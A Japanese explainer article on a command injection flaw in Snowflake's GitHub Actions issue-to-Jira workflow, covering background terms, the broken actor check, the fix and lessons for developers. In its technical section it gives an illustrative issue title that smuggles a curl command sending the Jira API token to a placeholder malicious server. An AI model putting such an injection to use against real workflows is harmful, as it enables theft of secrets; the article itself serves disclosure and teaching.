# SnowflakeのGitHub自動化ツールに欠陥：イシュー投稿だけで内部パスワードが盗まれる脆弱性

**元記事**: [Snowflake GitHub Actions Flaw Lets Crafted Issues Trigger Command Injection](https://inl03.netline.com/ltr6/?_m=3n.009a.4059.sp0ao46r89.347u)
**解説日**: 2026年8月18日

---

## 背景知識

このニュースを理解するために、いくつかの前提知識を説明します。

### 🏔️ Snowflakeとは？
**Snowflake（スノーフレーク）**は、企業が大量のデータをクラウド上で管理・分析するためのサービスです。多くの大企業が利用しており、「データウェアハウス」と呼ばれる巨大なデータ倉庫のような役割を果たします。

### 🐙 GitHubとは？
**GitHub（ギットハブ）**は、プログラマーがコード（プログラムのソースコード）を保存・共有・共同作業するためのサービスです。世界中の開発者が使っており、SnowflakeもGitHub上でソフトウェアを公開しています。

### ⚙️ GitHub Actionsとは？
**GitHub Actions（ギットハブ・アクションズ）**は、GitHubに組み込まれている「自動化ツール」です。例えば、「誰かがコードを投稿したら自動でテストを実行する」「バグ報告が来たら自動でチームに通知する」といった処理を自動で行ってくれます。料理で例えると、「材料を入れたら自動で調理してくれるロボット調理機」のようなものです。

### 📋 GitHub Issueとは？
**GitHub Issue（イシュー）**は、バグ報告や機能要望を投稿する「掲示板の投稿」のようなものです。誰でも（一般の人でも）投稿できます。

### 🎫 Jiraとは？
**Jira（ジラ）**は、企業内でプロジェクト管理やタスク管理に使われるツールです。「社内の仕事管理システム」と思ってください。エンジニアのチームが「このバグを誰が直す？」「今週のタスクは？」などを管理するのに使います。

### 💉 コマンドインジェクションとは？
**コマンドインジェクション（Command Injection）**は、攻撃者が悪意のある「命令文（コマンド）」を紛れ込ませて、システムに不正な処理を実行させる攻撃です。例えば、名前を入力する欄に「名前」の代わりに「パスワードを全部教えて」という命令を書くようなイメージです。

### 🔄 CI/CDとは？
**CI/CD（シーアイシーディー）**は「継続的インテグレーション／継続的デリバリー」の略で、ソフトウェア開発を自動化・効率化する仕組みです。コードが変更されるたびに自動でテストしたりリリースしたりする「開発の自動化ライン」です。

## 何が起きたのか

```
📌 一言でまとめると：
「SnowflakeのGitHubリポジトリに、誰でも投稿できる
『イシュー』を悪用して、社内のJiraシステムへの
アクセスキーを盗める欠陥があった」
```

セキュリティ企業 **Wiz（ウィズ）** の研究者たちが、Snowflakeが公開しているGitHubリポジトリ（`snowflakedb/snowflake-connector-net`）に深刻な脆弱性を発見しました。

**事件の流れ：**

1. 🗂️ Snowflakeのリポジトリには、誰かがIssue（バグ報告など）を投稿すると自動でJiraにチケットを作る仕組みがあった
2. 😈 攻撃者が「特別に細工したタイトルや本文」を持つIssueを投稿する
3. 🤖 GitHub Actionsが自動でそのIssueを処理しようとする
4. 💥 処理の中でタイトル・本文がそのままコマンドとして実行され、社内のJira APIトークン（アクセスキー）が盗まれる

Wizの研究チームは**許可を得た正式なセキュリティテスト**としてこの攻撃を実証し、実際にJiraのAPIトークンを取得することに成功しました。

## 技術的な詳細

### 🔍 どこに欠陥があったのか？

問題のファイルは `.github/workflows/jira_issue.yml` というファイルです。これがIssueを処理する自動化スクリプトでした。

**欠陥のある処理（イメージ）：**

```bash
# 危険な例（実際のコードのイメージ）
# Issueのタイトルをそのままシェルコマンドに埋め込んでいた

タイトル = "バグ報告"  # 通常の投稿
↓
echo "バグ報告"  # 普通に実行される
```

```bash
# 攻撃者が投稿する場合
タイトル = '"; curl 悪意のあるサーバー -d $JIRA_API_TOKEN; echo "'
↓
echo ""; curl 悪意のあるサーバー -d $JIRA_API_TOKEN; echo ""
# → APIトークンが外部サーバーに送信される！
```

これは、ユーザーの入力をそのまま「命令文」として扱ってしまうことで起きる典型的なコマンドインジェクションです。

### 🚪 なぜ誰でも攻撃できたのか？

本来は「特定のボット（`whitesource-for-github-com[bot]`）しかこの処理を実行できない」という確認が入っていました。しかし、確認するための条件が**間違っていました。**

- ❌ 誤り：「プルリクエスト（コード変更の申請）を投稿したユーザー名」を確認していた
- ✅ 正しくすべきだった：「Issueを投稿したユーザー名」を確認するべきだった

IssueとプルリクエストはGitHub上では別物です。Issueに関する処理なのにプルリクエストのユーザー名を参照しようとしたため、GitHubは「そんなデータは存在しない」として**空欄（空文字）**を返しました。

その結果、「誰が投稿したか」のチェックが**事実上スルー**され、誰でも攻撃できる状態になっていたのです。

### 🔑 盗まれたものは何か？

Wizの研究者が取得したのは、`qa@snowflake.net` というアカウントに紐づく**Jira APIトークン**です。このトークンがあると：

- 📁 エンジニアリング関連のJiraプロジェクトを閲覧できる
- 🛡️ セキュリティコンプライアンス関連のデータを読める
- 🐛 バグバウンティ（脆弱性報告報酬プログラム）の管理情報を読める

これらはSnowflakeの内部情報であり、外部に漏れるべきではない情報です。

### 🤖 AIが欠陥コードを作った？

記事には**GitHub Copilot Autofix（コパイロット・オートフィックス）**というAIツールの関与が言及されています。これはAIがコードのバグを自動修正するツールです。

ただし、調査の結果：
- AIが「別のファイル（jira_close.yml）」を修正したことは確認できた
- 今回の欠陥ファイル（jira_issue.yml）は人間のエンジニア（sfc-gh-hpathak）によるコミットが原因と見られる
- AIはそのプルリクエストの「共著者」ではあったが、欠陥行の「作者」とは断定できない

「AIがバグを作った」と断言はできませんが、AIツールが開発に関与していたのは事実です。

## なぜ重要なのか

### 🌍 誰でも攻撃できた
このリポジトリは**公開リポジトリ（誰でも見られる）**なので、Issueも誰でも投稿できます。つまり、GitHubアカウントさえあれば世界中の誰でも攻撃者になれる状態でした。

### ⏰ 5日間も欠陥が存在していた
欠陥のあるコードがマージ（取り込まれた）されたのは **2026年6月18日**、発見・修正されたのは **2026年6月23日**。**5日間**この状態が続いていました。

### 🔐 内部情報への入り口だった
Jiraのトークンがあれば、Snowflake社内のセキュリティ情報やバグ情報にアクセスできる可能性がありました。これは社内の「合鍵」を盗まれるようなものです。

### ✅ 幸いだったこと
- Snowflakeは「不正アクセスの証拠は見つからなかった」と述べています
- トークンは翌日（6月24日）には無効化されました
- 実際にユーザーへの被害は確認されていません
- .NETコネクターのリリース版への影響もありません

## 対策・今後の展望

### 🔧 Snowflakeが行った修正

問題のある部分を修正した方法は、**「入力値を直接コマンドに埋め込まない」** というものです。

```bash
# 修正前（危険）：入力をそのまま使う
run: echo "${{ github.event.issue.title }}"

# 修正後（安全）：環境変数を経由して安全に渡す
env:
  ISSUE_TITLE: ${{ github.event.issue.title }}
run: echo "$ISSUE_TITLE" | jq -r '.'
```

料理で例えると：「お客さんから受け取った食材をそのまま調理する」のではなく、「一度専用の容器に入れてから安全に調理する」イメージです。

### 📚 開発者へのレッスン

GitHubも **2025年7月**に「Issueなどの外部からの入力は、直接 `run:` ブロックに埋め込まないこと」と警告を出していました。しかし、この修正コードはその後に作られており、ガイドラインが守られませんでした。

**開発者が学ぶべき教訓：**

| やってはいけないこと | やるべきこと |
|---|---|
| 外部入力をそのままコマンドに埋め込む | 必ず環境変数を経由する |
| ユーザー確認のロジックを間違える | 正しいイベントのプロパティを使う |
| AIの提案をレビューなしで採用する | AIの出力も人間がしっかり確認する |
| 不要な権限のトークンを使い回す | 最小限の権限のトークンを使う |

### 🔮 今後の動向

- 現時点でCVE（脆弱性の公式番号）は付与されていません
- 修正済みのコードはすでに本番ブランチに反映済みです
- SnowflakeのJiraの詳細な監査ログは公開されていません
